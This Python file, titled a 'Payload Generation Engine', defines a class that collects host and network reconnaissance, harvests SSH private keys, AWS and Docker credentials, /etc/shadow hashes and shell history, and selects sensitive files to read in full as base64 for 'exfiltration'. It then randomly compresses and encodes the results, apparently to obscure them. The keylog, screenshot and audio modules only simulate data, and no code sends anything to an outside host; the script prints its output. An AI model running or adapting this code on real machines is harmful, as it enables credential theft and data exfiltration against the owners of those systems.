#!/usr/bin/env python3
# Payload Generation Engine - Deus Ex Sophia
import os
import sys
import json
import time
import zlib
import lzma
import base64
import hashlib
import secrets
import random
import string
import struct
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
import mimetypes

class PayloadFactory:
    def __init__(self):
        self.payload_types = {
            "system_info": self.generate_system_info,
            "network_scan": self.generate_network_scan,
            "credential_harvest": self.generate_credential_harvest,
            "file_exfil": self.generate_file_exfil,
            "keylog": self.generate_keylog_data,
            "screenshot": self.generate_screenshot_data,
            "audio_capture": self.generate_audio_data,
            "network_traffic": self.generate_network_traffic,
            "process_list": self.generate_process_list,
            "user_activity": self.generate_user_activity
        }
        
        self.compression_methods = ["none", "zlib", "lzma", "bzip2"]
        self.encoding_methods = ["base64", "base32", "hex", "ascii85"]
        
    def generate_system_info(self):
        """Generate system information payload"""
        import platform
        import psutil
        import socket
        import uuid
        
        info = {
            "timestamp": datetime.now().isoformat(),
            "system": {
                "hostname": socket.gethostname(),
                "os": platform.system(),
                "os_version": platform.version(),
                "os_release": platform.release(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "node": platform.node(),
                "machine_uuid": str(uuid.getnode())
            },
            "hardware": {
                "cpu_cores": psutil.cpu_count(),
                "cpu_freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {},
                "memory_total": psutil.virtual_memory().total,
                "memory_available": psutil.virtual_memory().available,
                "disk_total": psutil.disk_usage('/').total,
                "disk_used": psutil.disk_usage('/').used
            },
            "network": {
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "mac_address": self.get_mac_address(),
                "interfaces": self.get_network_interfaces(),
                "connections": self.get_active_connections()
            },
            "users": self.get_user_info(),
            "processes": self.get_process_count(),
            "uptime": self.get_uptime()
        }
        
        return info
    
    def get_mac_address(self):
        """Get MAC address"""
        try:
            import netifaces
            for iface in netifaces.interfaces():
                if iface != 'lo':
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_LINK in addrs:
                        return addrs[netifaces.AF_LINK][0]['addr']
        except:
            pass
        
        # Fallback method
        try:
            with open('/sys/class/net/eth0/address', 'r') as f:
                return f.read().strip()
        except:
            return "00:00:00:00:00:00"
    
    def get_network_interfaces(self):
        """Get network interfaces"""
        interfaces = []
        try:
            import netifaces
            for iface in netifaces.interfaces():
                if iface != 'lo':
                    addrs = netifaces.ifaddresses(iface)
                    iface_info = {"name": iface}
                    
                    if netifaces.AF_LINK in addrs:
                        iface_info["mac"] = addrs[netifaces.AF_LINK][0]['addr']
                    
                    if netifaces.AF_INET in addrs:
                        iface_info["ipv4"] = addrs[netifaces.AF_INET][0]['addr']
                        iface_info["netmask"] = addrs[netifaces.AF_INET][0]['netmask']
                    
                    if netifaces.AF_INET6 in addrs:
                        iface_info["ipv6"] = addrs[netifaces.AF_INET6][0]['addr']
                    
                    interfaces.append(iface_info)
        except:
            pass
        
        return interfaces
    
    def get_active_connections(self):
        """Get active network connections"""
        connections = []
        try:
            import psutil
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED':
                    connections.append({
                        "local": f"{conn.laddr.ip}:{conn.laddr.port}",
                        "remote": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                        "status": conn.status,
                        "pid": conn.pid
                    })
        except:
            pass
        
        return connections[:10]  # Limit to 10
    
    def get_user_info(self):
        """Get user information"""
        users = []
        try:
            import pwd
            for user in pwd.getpwall():
                if user.pw_uid >= 1000:  # Regular users
                    users.append({
                        "username": user.pw_name,
                        "uid": user.pw_uid,
                        "gid": user.pw_gid,
                        "home": user.pw_dir,
                        "shell": user.pw_shell
                    })
        except:
            pass
        
        return users
    
    def get_process_count(self):
        """Get process count"""
        try:
            import psutil
            return len(list(psutil.process_iter()))
        except:
            return 0
    
    def get_uptime(self):
        """Get system uptime"""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
                days = int(uptime_seconds // 86400)
                hours = int((uptime_seconds % 86400) // 3600)
                minutes = int((uptime_seconds % 3600) // 60)
                return f"{days}d {hours}h {minutes}m"
        except:
            return "unknown"
    
    def generate_network_scan(self):
        """Generate network scan payload"""
        import socket
        import subprocess
        
        scan_data = {
            "timestamp": datetime.now().isoformat(),
            "local_network": self.scan_local_network(),
            "arp_cache": self.get_arp_cache(),
            "routing_table": self.get_routing_table(),
            "dns_servers": self.get_dns_servers(),
            "open_ports": self.scan_local_ports()
        }
        
        return scan_data
    
    def scan_local_network(self):
        """Scan local network"""
        hosts = []
        try:
            import ipaddress
            import subprocess
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 53))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Create network
            network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
            
            # Scan first 20 hosts
            for host in list(network.hosts())[:20]:
                ip = str(host)
                if ip != local_ip:
                    # Quick ping
                    result = subprocess.run(
                        ["ping", "-c", "1", "-W", "1", ip],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    
                    if result.returncode == 0:
                        hosts.append({
                            "ip": ip,
                            "alive": True,
                            "hostname": self.reverse_dns_lookup(ip)
                        })
                    else:
                        hosts.append({
                            "ip": ip,
                            "alive": False
                        })
                        
        except:
            pass
        
        return hosts
    
    def reverse_dns_lookup(self, ip):
        """Perform reverse DNS lookup"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None
    
    def get_arp_cache(self):
        """Get ARP cache"""
        arp_entries = []
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '(' in line and ')' in line:
                    ip = line.split('(')[1].split(')')[0]
                    parts = line.split()
                    if len(parts) >= 4:
                        arp_entries.append({
                            "ip": ip,
                            "mac": parts[3],
                            "interface": parts[5] if len(parts) > 5 else "unknown"
                        })
        except:
            pass
        
        return arp_entries
    
    def get_routing_table(self):
        """Get routing table"""
        routes = []
        try:
            result = subprocess.run(['ip', 'route', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if line.strip():
                    routes.append(line.strip())
        except:
            pass
        
        return routes
    
    def get_dns_servers(self):
        """Get DNS servers"""
        servers = []
        try:
            with open('/etc/resolv.conf', 'r') as f:
                for line in f:
                    if line.startswith('nameserver'):
                        servers.append(line.split()[1])
        except:
            pass
        
        return servers
    
    def scan_local_ports(self):
        """Scan local machine ports"""
        open_ports = []
        try:
            import psutil
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN':
                    open_ports.append({
                        "port": conn.laddr.port,
                        "protocol": "tcp" if conn.type == socket.SOCK_STREAM else "udp",
                        "pid": conn.pid,
                        "process": self.get_process_name(conn.pid)
                    })
        except:
            pass
        
        return open_ports[:20]  # Limit to 20
    
    def get_process_name(self, pid):
        """Get process name from PID"""
        try:
            import psutil
            return psutil.Process(pid).name()
        except:
            return "unknown"
    
    def generate_credential_harvest(self):
        """Generate credential harvest payload"""
        credentials = {
            "timestamp": datetime.now().isoformat(),
            "ssh_keys": self.harvest_ssh_keys(),
            "aws_credentials": self.harvest_aws_creds(),
            "docker_configs": self.harvest_docker_configs(),
            "browser_data": self.harvest_browser_data(),
            "password_hashes": self.harvest_password_hashes()
        }
        
        return credentials
    
    def harvest_ssh_keys(self):
        """Harvest SSH keys"""
        ssh_keys = []
        import glob
        
        try:
            for key_file in glob.glob("/home/*/.ssh/id_*"):
                if not key_file.endswith(".pub"):
                    try:
                        with open(key_file, "r") as f:
                            content = f.read()
                            if "PRIVATE" in content or "BEGIN" in content:
                                ssh_keys.append({
                                    "path": key_file,
                                    "size": os.path.getsize(key_file),
                                    "hash": hashlib.sha256(content.encode()).hexdigest()[:16]
                                })
                    except:
                        continue
            
            # Check root
            root_key = "/root/.ssh/id_rsa"
            if os.path.exists(root_key):
                with open(root_key, "r") as f:
                    content = f.read()
                    ssh_keys.append({
                        "path": root_key,
                        "size": os.path.getsize(root_key),
                        "hash": hashlib.sha256(content.encode()).hexdigest()[:16]
                    })
        except:
            pass
        
        return ssh_keys
    
    def harvest_aws_creds(self):
        """Harvest AWS credentials"""
        aws_creds = []
        import glob
        import re
        
        try:
            for cred_file in glob.glob("/home/*/.aws/credentials"):
                try:
                    with open(cred_file, "r") as f:
                        content = f.read()
                        
                        # Extract access keys
                        access_key = re.search(r'aws_access_key_id\s*=\s*(\S+)', content)
                        secret_key = re.search(r'aws_secret_access_key\s*=\s*(\S+)', content)
                        
                        if access_key and secret_key:
                            aws_creds.append({
                                "path": cred_file,
                                "access_key": access_key.group(1)[:8] + "..." if access_key else None,
                                "secret_key": secret_key.group(1)[:8] + "..." if secret_key else None
                            })
                except:
                    continue
        except:
            pass
        
        return aws_creds
    
    def harvest_docker_configs(self):
        """Harvest Docker configurations"""
        docker_configs = []
        import glob
        
        try:
            for config_file in glob.glob("/home/*/.docker/config.json"):
                try:
                    with open(config_file, "r") as f:
                        content = f.read()
                        docker_configs.append({
                            "path": config_file,
                            "size": len(content),
                            "has_auths": '"auths"' in content
                        })
                except:
                    continue
        except:
            pass
        
        return docker_configs
    
    def harvest_browser_data(self):
        """Harvest browser data (metadata only)"""
        browser_data = {"available": False}
        
        # Just report if browser data might exist
        import glob
        browser_paths = [
            "/home/*/.mozilla/firefox/*.default*/",
            "/home/*/.config/google-chrome/Default/",
            "/home/*/.config/chromium/Default/"
        ]
        
        for path_pattern in browser_paths:
            if glob.glob(path_pattern):
                browser_data["available"] = True
                break
        
        return browser_data
    
    def harvest_password_hashes(self):
        """Harvest password hashes"""
        hashes = []
        
        try:
            if os.path.exists("/etc/shadow") and os.access("/etc/shadow", os.R_OK):
                with open("/etc/shadow", "r") as f:
                    lines = f.readlines()
                    for line in lines[:5]:  # First 5 entries
                        parts = line.strip().split(":")
                        if len(parts) > 1 and parts[1] not in ["*", "!", "!!", ""]:
                            hashes.append({
                                "user": parts[0],
                                "hash": parts[1][:32] + "..." if len(parts[1]) > 32 else parts[1]
                            })
        except:
            pass
        
        return hashes
    
    def generate_file_exfil(self, file_path=None):
        """Generate file exfiltration payload"""
        if file_path is None:
            # Find interesting files
            interesting_files = self.find_interesting_files()
            if interesting_files:
                file_path = random.choice(interesting_files)
            else:
                return {"error": "No interesting files found"}
        
        try:
            if os.path.exists(file_path):
                file_info = {
                    "timestamp": datetime.now().isoformat(),
                    "path": file_path,
                    "size": os.path.getsize(file_path),
                    "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                    "type": mimetypes.guess_type(file_path)[0] or "unknown",
                    "content": self.read_file_safely(file_path)
                }
                return file_info
            else:
                return {"error": f"File not found: {file_path}"}
        except Exception as e:
            return {"error": str(e)}
    
    def find_interesting_files(self):
        """Find potentially interesting files"""
        interesting_patterns = [
            "/home/*/.ssh/*",
            "/home/*/.aws/*",
            "/home/*/.config/*",
            "/home/*/Documents/*",
            "/home/*/Downloads/*",
            "/home/*/Desktop/*",
            "/tmp/*",
            "/var/log/*.log",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts"
        ]
        
        import glob
        files = []
        for pattern in interesting_patterns:
            try:
                files.extend(glob.glob(pattern))
            except:
                pass
        
        # Filter by size (max 100KB for exfiltration)
        files = [f for f in files if os.path.isfile(f) and os.path.getsize(f) <= 102400]
        
        return files[:10]  # Limit to 10 files
    
    def read_file_safely(self, file_path, max_size=10240):
        """Read file safely with size limit"""
        try:
            size = os.path.getsize(file_path)
            if size > max_size:
                # Read only first part
                with open(file_path, 'rb') as f:
                    content = f.read(max_size)
                return base64.b64encode(content).decode() + f"... [truncated, total {size} bytes]"
            else:
                with open(file_path, 'rb') as f:
                    content = f.read()
                return base64.b64encode(content).decode()
        except:
            return "[unreadable]"
    
    def generate_keylog_data(self):
        """Generate simulated keylog data"""
        # This is a simulation - real keylogging would require root access
        common_phrases = [
            "sudo apt-get update",
            "cd /home/user",
            "ls -la",
            "ssh user@host",
            "password123",
            "git push origin master",
            "echo 'hello world'",
            "vim /etc/config",
            "systemctl restart service",
            "ping 8.8.8.8"
        ]
        
        return {
            "timestamp": datetime.now().isoformat(),
            "simulated_entries": random.sample(common_phrases, random.randint(3, 7))
        }
    
    def generate_screenshot_data(self):
        """Generate simulated screenshot data"""
        # Simulation - real screenshots would require GUI access
        return {
            "timestamp": datetime.now().isoformat(),
            "simulated": True,
            "resolution": f"{random.randint(800, 3840)}x{random.randint(600, 2160)}",
            "color_depth": random.choice([8, 16, 24, 32]),
            "size_estimate": random.randint(100000, 5000000)
        }
    
    def generate_audio_data(self):
        """Generate simulated audio capture data"""
        return {
            "timestamp": datetime.now().isoformat(),
            "simulated": True,
            "duration": random.randint(1, 60),
            "sample_rate": random.choice([8000, 16000, 44100, 48000]),
            "channels": random.choice([1, 2]),
            "format": random.choice(["wav", "mp3", "flac"])
        }
    
    def generate_network_traffic(self):
        """Generate network traffic analysis"""
        import psutil
        
        traffic = {
            "timestamp": datetime.now().isoformat(),
            "bytes_sent": psutil.net_io_counters().bytes_sent,
            "bytes_recv": psutil.net_io_counters().bytes_recv,
            "packets_sent": psutil.net_io_counters().packets_sent,
            "packets_recv": psutil.net_io_counters().packets_recv,
            "error_in": psutil.net_io_counters().errin,
            "error_out": psutil.net_io_counters().errout,
            "drop_in": psutil.net_io_counters().dropin,
            "drop_out": psutil.net_io_counters().dropout
        }
        
        return traffic
    
    def generate_process_list(self):
        """Generate process list"""
        import psutil
        
        processes = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except:
            pass
        
        # Limit to top 10 by CPU
        processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total": len(processes),
            "top_processes": processes[:10]
        }
    
    def generate_user_activity(self):
        """Generate user activity report"""
        activity = {
            "timestamp": datetime.now().isoformat(),
            "logged_in_users": self.get_logged_in_users(),
            "recent_commands": self.get_recent_commands(),
            "active_sessions": self.get_active_sessions()
        }
        
        return activity
    
    def get_logged_in_users(self):
        """Get logged in users"""
        users = []
        try:
            import subprocess
            result = subprocess.run(['who'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 3:
                        users.append({
                            "user": parts[0],
                            "terminal": parts[1],
                            "login_time": ' '.join(parts[2:4]) if len(parts) >= 4 else parts[2]
                        })
        except:
            pass
        
        return users
    
    def get_recent_commands(self):
        """Get recent shell commands"""
        commands = []
        
        # Check shell history files
        history_files = [
            "/root/.bash_history",
            "/home/*/.bash_history",
            "/home/*/.zsh_history"
        ]
        
        import glob
        for pattern in history_files:
            for history_file in glob.glob(pattern):
                try:
                    with open(history_file, 'r') as f:
                        lines = f.readlines()[-10:]  # Last 10 commands
                        for line in lines:
                            cmd = line.strip()
                            if cmd and len(cmd) < 100:
                                commands.append({
                                    "user": os.path.basename(os.path.dirname(history_file)),
                                    "command": cmd
                                })
                except:
                    continue
        
        return commands[:5]  # Limit to 5
    
    def get_active_sessions(self):
        """Get active sessions"""
        sessions = []
        try:
            import subprocess
            # Get SSH sessions
            result = subprocess.run(['ss', '-tpn'], capture_output=True, text=True)
            for line in result.stdout.split('\n')[1:]:  # Skip header
                if 'ESTAB' in line and ':22' in line:
                    parts = line.split()
                    if len(parts) >= 6:
                        sessions.append({
                            "type": "ssh",
                            "connection": parts[4],
                            "process": parts[5] if len(parts) > 5 else "unknown"
                        })
        except:
            pass
        
        return sessions
    
    def create_payload(self, payload_type="system_info", compress=True, encode=True):
        """Create payload with optional compression and encoding"""
        if payload_type not in self.payload_types:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        # Generate payload data
        data = self.payload_types[payload_type]()
        
        # Convert to JSON
        json_data = json.dumps(data, separators=(',', ':'))
        
        # Optional compression
        if compress and len(json_data) > 100:
            compression_method = random.choice(self.compression_methods[1:])  # Skip 'none'
            
            if compression_method == "zlib":
                compressed = zlib.compress(json_data.encode())
            elif compression_method == "lzma":
                compressed = lzma.compress(json_data.encode())
            else:
                compressed = json_data.encode()
            
            compression_info = {
                "method": compression_method,
                "original_size": len(json_data),
                "compressed_size": len(compressed)
            }
        else:
            compressed = json_data.encode()
            compression_info = {"method": "none"}
        
        # Optional encoding
        if encode:
            encoding_method = random.choice(self.encoding_methods)
            
            if encoding_method == "base64":
                encoded = base64.b64encode(compressed).decode()
            elif encoding_method == "base32":
                encoded = base64.b32encode(compressed).decode()
            elif encoding_method == "hex":
                encoded = compressed.hex()
            elif encoding_method == "ascii85":
                import base64
                encoded = base64.a85encode(compressed).decode()
            else:
                encoded = compressed.decode('latin-1')
            
            encoding_info = {"method": encoding_method}
        else:
            encoded = compressed
            encoding_info = {"method": "none"}
        
        # Create final payload package
        package = {
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "payload_type": payload_type,
                "compression": compression_info,
                "encoding": encoding_info,
                "version": "2.0"
            },
            "data": encoded if isinstance(encoded, str) else encoded.decode('latin-1')
        }
        
        return package
    
    def create_multi_payload(self, count=3):
        """Create multiple payloads"""
        payloads = []
        available_types = list(self.payload_types.keys())
        
        for _ in range(min(count, len(available_types))):
            payload_type = random.choice(available_types)
            available_types.remove(payload_type)  # Don't repeat types
            
            payload = self.create_payload(payload_type, random.choice([True, False]))
            payloads.append(payload)
        
        return payloads

if __name__ == "__main__":
    factory = PayloadFactory()
    
    if len(sys.argv) > 1:
        if sys.argv[1] == "--list":
            print("Available payload types:")
            for ptype in factory.payload_types.keys():
                print(f"  {ptype}")
        
        elif sys.argv[1] == "--create" and len(sys.argv) > 2:
            payload_type = sys.argv[2]
            compress = "--no-compress" not in sys.argv
            encode = "--no-encode" not in sys.argv
            
            payload = factory.create_payload(payload_type, compress, encode)
            print(json.dumps(payload, indent=2))
        
        elif sys.argv[1] == "--multi":
            count = int(sys.argv[2]) if len(sys.argv) > 2 else 3
            payloads = factory.create_multi_payload(count)
            print(json.dumps(payloads, indent=2))
        
        elif sys.argv[1] == "--test":
            print("Testing payload generation...")
            for ptype in ["system_info", "network_scan", "process_list"]:
                print(f"\n{ptype}:")
                payload = factory.create_payload(ptype)
                metadata = payload["metadata"]
                print(f"  Size: {len(json.dumps(payload))} bytes")
                print(f"  Compression: {metadata['compression']['method']}")
                print(f"  Encoding: {metadata['encoding']['method']}")
    
    else:
        print("Payload Factory - Deus Ex Sophia")
        print("Commands: --list, --create <type>, --multi [count], --test")
